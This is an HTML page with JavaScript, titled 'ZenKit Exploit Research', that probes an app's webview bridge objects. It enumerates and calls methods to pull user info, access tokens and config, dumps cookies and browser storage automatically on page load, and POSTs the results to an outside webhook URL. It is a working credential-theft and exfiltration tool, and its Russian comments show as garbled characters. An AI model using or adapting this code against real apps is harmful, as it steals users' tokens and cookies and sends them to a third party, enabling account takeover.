<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZenKit Exploit Research</title>
    <style>
        body {
            font-family: monospace;
            padding: 15px;
            background: #0d1117;
            color: #c9d1d9;
            font-size: 14px;
        }
        h1 { color: #58a6ff; font-size: 18px; }
        h2 { color: #f0883e; font-size: 16px; margin-top: 25px; }
        #results {
            background: #161b22;
            padding: 15px;
            border-radius: 8px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
            margin: 10px 0;
            border: 1px solid #30363d;
        }
        .found { color: #3fb950; }
        .warn { color: #d29922; }
        .error { color: #f85149; }
        .info { color: #58a6ff; }
        button {
            padding: 10px 15px;
            margin: 5px;
            background: #238636;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
        }
        button:hover { background: #2ea043; }
        .btn-danger { background: #da3633; }
        .btn-danger:hover { background: #f85149; }
        .section {
            margin: 20px 0;
            padding: 15px;
            background: #161b22;
            border-radius: 8px;
            border: 1px solid #30363d;
        }
    </style>
</head>
<body>
    <h1>üîì ZenKit Interface Exploitation</h1>
    
    <div class="section">
        <h2>1. Dump Interfaces</h2>
        <button onclick="dumpZenkit()">Dump ZENKIT</button>
        <button onclick="dumpNativeZenkit()">Dump NATIVE_ZENKIT</button>
        <button onclick="dumpLaunchOptions()">Dump LAUNCH_OPTIONS</button>
        <button onclick="dumpAll()">DUMP ALL</button>
    </div>
    
    <div class="section">
        <h2>2. Try Common Methods</h2>
        <button onclick="tryGetUser()">Get User Info</button>
        <button onclick="tryGetToken()">Get Token</button>
        <button onclick="tryGetConfig()">Get Config</button>
        <button onclick="tryGetCookies()">Get Cookies</button>
    </div>
    
    <div class="section">
        <h2>3. Dangerous Actions</h2>
        <button class="btn-danger" onclick="tryOpenUrl()">Open URL</button>
        <button class="btn-danger" onclick="tryPostMessage()">Post Message</button>
        <button class="btn-danger" onclick="tryCallNative()">Call Native</button>
    </div>
    
    <div id="results">–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ—è–≤—è—Ç—Å—è –∑–¥–µ—Å—å...</div>
    
    <div class="section">
        <h2>4. Send Results to Server</h2>
        <button onclick="sendToServer()">üì§ Send to Webhook</button>
    </div>

    <script>
        var resultsDiv = document.getElementById('results');
        var collectedData = {};
        
        function log(msg, type) {
            var className = type || '';
            resultsDiv.innerHTML += '<span class="' + className + '">' + msg + '</span>\n';
            resultsDiv.scrollTop = resultsDiv.scrollHeight;
        }
        
        function clear() {
            resultsDiv.innerHTML = '';
        }
        
        function stringify(obj, depth) {
            depth = depth || 0;
            if (depth > 3) return '[MAX DEPTH]';
            
            try {
                if (obj === null) return 'null';
                if (obj === undefined) return 'undefined';
                if (typeof obj === 'function') return '[Function: ' + (obj.name || 'anonymous') + ']';
                if (typeof obj !== 'object') return String(obj);
                
                var result = '{\n';
                var keys = [];
                
                // –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ —Å–≤–æ–π—Å—Ç–≤–∞
                for (var key in obj) {
                    keys.push(key);
                }
                try {
                    keys = keys.concat(Object.getOwnPropertyNames(obj));
                } catch(e) {}
                
                // –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ –∫–ª—é—á–∏
                keys = keys.filter(function(v, i, a) { return a.indexOf(v) === i; });
                
                for (var i = 0; i < keys.length && i < 50; i++) {
                    var key = keys[i];
                    try {
                        var val = obj[key];
                        var indent = '  '.repeat(depth + 1);
                        result += indent + key + ': ' + stringify(val, depth + 1) + '\n';
                    } catch(e) {
                        result += '  '.repeat(depth + 1) + key + ': [Error: ' + e.message + ']\n';
                    }
                }
                
                if (keys.length > 50) {
                    result += '  '.repeat(depth + 1) + '... and ' + (keys.length - 50) + ' more\n';
                }
                
                return result + '  '.repeat(depth) + '}';
            } catch(e) {
                return '[Error: ' + e.message + ']';
            }
        }
        
        function dumpZenkit() {
            clear();
            log('=== ZENKIT OBJECT ===\n', 'info');
            
            if (typeof ZENKIT === 'undefined') {
                log('ZENKIT is undefined!', 'error');
                return;
            }
            
            collectedData.ZENKIT = {};
            
            log('Type: ' + typeof ZENKIT, 'info');
            log('\nMethods and Properties:\n', 'warn');
            
            var keys = Object.getOwnPropertyNames(ZENKIT);
            for (var i = 0; i < keys.length; i++) {
                var key = keys[i];
                try {
                    var val = ZENKIT[key];
                    var type = typeof val;
                    collectedData.ZENKIT[key] = type;
                    
                    if (type === 'function') {
                        log('‚úì ' + key + '() - FUNCTION', 'found');
                        // –ü–æ–ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
                        try {
                            log('  Signature: ' + val.toString().split('{')[0], 'info');
                        } catch(e) {}
                    } else {
                        log('  ' + key + ': ' + stringify(val), '');
                    }
                } catch(e) {
                    log('‚úó ' + key + ': [Error: ' + e.message + ']', 'error');
                }
            }
        }
        
        function dumpNativeZenkit() {
            clear();
            log('=== NATIVE_ZENKIT OBJECT ===\n', 'info');
            
            if (typeof NATIVE_ZENKIT === 'undefined') {
                log('NATIVE_ZENKIT is undefined!', 'error');
                return;
            }
            
            collectedData.NATIVE_ZENKIT = {};
            
            log('Type: ' + typeof NATIVE_ZENKIT, 'info');
            log('\nMethods and Properties:\n', 'warn');
            
            // –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Å–≤–æ–π—Å—Ç–≤–∞
            var keys = [];
            try { keys = keys.concat(Object.keys(NATIVE_ZENKIT)); } catch(e) {}
            try { keys = keys.concat(Object.getOwnPropertyNames(NATIVE_ZENKIT)); } catch(e) {}
            try { 
                for (var k in NATIVE_ZENKIT) keys.push(k);
            } catch(e) {}
            
            // –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ
            keys = keys.filter(function(v, i, a) { return a.indexOf(v) === i; });
            
            if (keys.length === 0) {
                log('No enumerable properties found. Trying common method names...', 'warn');
                
                var commonMethods = [
                    'getUser', 'getUserInfo', 'getToken', 'getAccessToken',
                    'getConfig', 'getSettings', 'getData', 'getState',
                    'init', 'initialize', 'call', 'invoke', 'execute',
                    'postMessage', 'sendMessage', 'emit', 'dispatch',
                    'openUrl', 'openLink', 'navigate', 'redirect',
                    'showAlert', 'showDialog', 'toast',
                    'getDeviceId', 'getDeviceInfo', 'getPlatform',
                    'getCookies', 'getStorage', 'getSession',
                    'login', 'logout', 'authorize', 'auth'
                ];
                
                for (var i = 0; i < commonMethods.length; i++) {
                    var method = commonMethods[i];
                    try {
                        if (typeof NATIVE_ZENKIT[method] !== 'undefined') {
                            log('‚úì ' + method + ' EXISTS!', 'found');
                            collectedData.NATIVE_ZENKIT[method] = typeof NATIVE_ZENKIT[method];
                        }
                    } catch(e) {}
                }
            } else {
                for (var i = 0; i < keys.length; i++) {
                    var key = keys[i];
                    try {
                        var val = NATIVE_ZENKIT[key];
                        var type = typeof val;
                        collectedData.NATIVE_ZENKIT[key] = type;
                        
                        if (type === 'function') {
                            log('‚úì ' + key + '() - FUNCTION', 'found');
                        } else {
                            log('  ' + key + ': ' + stringify(val), '');
                        }
                    } catch(e) {
                        log('‚úó ' + key + ': [Error]', 'error');
                    }
                }
            }
        }
        
        function dumpLaunchOptions() {
            clear();
            log('=== ZENKIT_LAUNCH_OPTIONS ===\n', 'info');
            
            if (typeof ZENKIT_LAUNCH_OPTIONS === 'undefined') {
                log('ZENKIT_LAUNCH_OPTIONS is undefined!', 'error');
                return;
            }
            
            collectedData.LAUNCH_OPTIONS = ZENKIT_LAUNCH_OPTIONS;
            log(stringify(ZENKIT_LAUNCH_OPTIONS), 'found');
        }
        
        function dumpAll() {
            clear();
            
            log('=== FULL DUMP ===\n', 'info');
            
            // ZENKIT
            log('\n--- ZENKIT ---', 'warn');
            if (typeof ZENKIT !== 'undefined') {
                log(stringify(ZENKIT), '');
            }
            
            // NATIVE_ZENKIT  
            log('\n--- NATIVE_ZENKIT ---', 'warn');
            if (typeof NATIVE_ZENKIT !== 'undefined') {
                log(stringify(NATIVE_ZENKIT), '');
            }
            
            // LAUNCH OPTIONS
            log('\n--- ZENKIT_LAUNCH_OPTIONS ---', 'warn');
            if (typeof ZENKIT_LAUNCH_OPTIONS !== 'undefined') {
                log(stringify(ZENKIT_LAUNCH_OPTIONS), '');
            }
            
            // handleZenKitPromiseResult
            log('\n--- handleZenKitPromiseResult ---', 'warn');
            if (typeof handleZenKitPromiseResult !== 'undefined') {
                log('Type: ' + typeof handleZenKitPromiseResult, '');
                log(handleZenKitPromiseResult.toString(), '');
            }
            
            // onZenKitEvent
            log('\n--- onZenKitEvent ---', 'warn');
            if (typeof onZenKitEvent !== 'undefined') {
                log('Type: ' + typeof onZenKitEvent, '');
                log(onZenKitEvent.toString(), '');
            }
            
            // Cookies & Storage
            log('\n--- COOKIES ---', 'warn');
            log(document.cookie || '[empty]', '');
            
            log('\n--- LOCAL STORAGE ---', 'warn');
            try {
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    log(key + ': ' + localStorage.getItem(key).substring(0, 100), '');
                }
            } catch(e) { log('Error: ' + e.message, 'error'); }
        }
        
        function tryGetUser() {
            clear();
            log('=== TRYING TO GET USER INFO ===\n', 'info');
            
            var methods = ['getUser', 'getUserInfo', 'user', 'getProfile', 'getAccount'];
            
            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
                if (typeof obj === 'undefined') return;
                
                methods.forEach(function(method) {
                    try {
                        if (typeof obj[method] === 'function') {
                            log('Calling ' + name + '.' + method + '()...', 'warn');
                            var result = obj[method]();
                            log('Result: ' + stringify(result), 'found');
                            collectedData.userInfo = result;
                        }
                    } catch(e) {
                        log(name + '.' + method + ' error: ' + e.message, 'error');
                    }
                });
            });
        }
        
        function tryGetToken() {
            clear();
            log('=== TRYING TO GET TOKENS ===\n', 'info');
            
            var methods = ['getToken', 'getAccessToken', 'getAuthToken', 'token', 'getSession'];
            
            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
                if (typeof obj === 'undefined') return;
                
                methods.forEach(function(method) {
                    try {
                        if (typeof obj[method] === 'function') {
                            log('Calling ' + name + '.' + method + '()...', 'warn');
                            var result = obj[method]();
                            log('üîë TOKEN: ' + stringify(result), 'found');
                            collectedData.token = result;
                        }
                    } catch(e) {
                        log(name + '.' + method + ' error: ' + e.message, 'error');
                    }
                });
            });
        }
        
        function tryGetConfig() {
            clear();
            log('=== TRYING TO GET CONFIG ===\n', 'info');
            
            var methods = ['getConfig', 'getSettings', 'config', 'settings', 'getEnvironment'];
            
            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
                if (typeof obj === 'undefined') return;
                
                methods.forEach(function(method) {
                    try {
                        if (typeof obj[method] === 'function') {
                            log('Calling ' + name + '.' + method + '()...', 'warn');
                            var result = obj[method]();
                            log('Result: ' + stringify(result), 'found');
                        }
                    } catch(e) {}
                });
            });
        }
        
        function tryGetCookies() {
            clear();
            log('=== COOKIES & STORAGE ===\n', 'info');
            
            log('Document cookies:', 'warn');
            log(document.cookie || '[empty]', 'found');
            
            log('\nLocalStorage:', 'warn');
            try {
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    var val = localStorage.getItem(key);
                    log(key + ': ' + val, 'found');
                    collectedData['localStorage_' + key] = val;
                }
            } catch(e) { log('Error: ' + e, 'error'); }
            
            log('\nSessionStorage:', 'warn');
            try {
                for (var i = 0; i < sessionStorage.length; i++) {
                    var key = sessionStorage.key(i);
                    var val = sessionStorage.getItem(key);
                    log(key + ': ' + val, 'found');
                }
            } catch(e) { log('Error: ' + e, 'error'); }
        }
        
        function tryOpenUrl() {
            clear();
            log('=== TRYING TO OPEN URL ===\n', 'info');
            
            var methods = ['openUrl', 'openLink', 'navigate', 'open', 'loadUrl'];
            var testUrl = 'https://example.com';
            
            [ZENKIT, NATIVE_ZENKIT].forEach(function(obj, idx) {
                var name = idx === 0 ? 'ZENKIT' : 'NATIVE_ZENKIT';
                if (typeof obj === 'undefined') return;
                
                methods.forEach(function(method) {
                    try {
                        if (typeof obj[method] === 'function') {
                            log('Found ' + name + '.' + method + '() - NOT calling for safety', 'warn');
                        }
                    } catch(e) {}
                });
            });
        }
        
        function tryPostMessage() {
            clear();
            log('=== POST MESSAGE TEST ===\n', 'info');
            
            try {
                if (typeof ZENKIT.postMessage === 'function') {
                    log('ZENKIT.postMessage exists!', 'found');
                }
                if (typeof ZENKIT.call === 'function') {
                    log('ZENKIT.call exists!', 'found');
                }
            } catch(e) {}
        }
        
        function tryCallNative() {
            clear();
            log('=== NATIVE CALL TEST ===\n', 'info');
            
            // –ü—Ä–æ–±—É–µ–º –≤—ã–∑–≤–∞—Ç—å handleZenKitPromiseResult —Å —Ç–µ—Å—Ç–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
            try {
                if (typeof handleZenKitPromiseResult === 'function') {
                    log('handleZenKitPromiseResult signature:', 'warn');
                    log(handleZenKitPromiseResult.toString().substring(0, 500), '');
                }
            } catch(e) {}
            
            try {
                if (typeof onZenKitEvent === 'function') {
                    log('\nonZenKitEvent signature:', 'warn');
                    log(onZenKitEvent.toString().substring(0, 500), '');
                }
            } catch(e) {}
        }
        
        function sendToServer() {
            var data = {
                url: window.location.href,
                userAgent: navigator.userAgent,
                cookies: document.cookie,
                collected: collectedData,
                zenkit: typeof ZENKIT !== 'undefined' ? Object.keys(ZENKIT) : null,
                nativeZenkit: typeof NATIVE_ZENKIT !== 'undefined' ? 'exists' : null,
                launchOptions: typeof ZENKIT_LAUNCH_OPTIONS !== 'undefined' ? ZENKIT_LAUNCH_OPTIONS : null
            };
            
            log('\nSending to webhook...', 'info');
            
            // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π webhook
            fetch('https://webhook.tuna.am/387WocKA8chxCpAjoA4S1rxg7cV', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(function(r) { log('‚úì Sent successfully!', 'found'); })
            .catch(function(e) { log('Error: ' + e, 'error'); });
        }
        
        // Auto-run on load
        window.onload = function() {
            dumpAll();
        };
    </script>
</body>
</html>
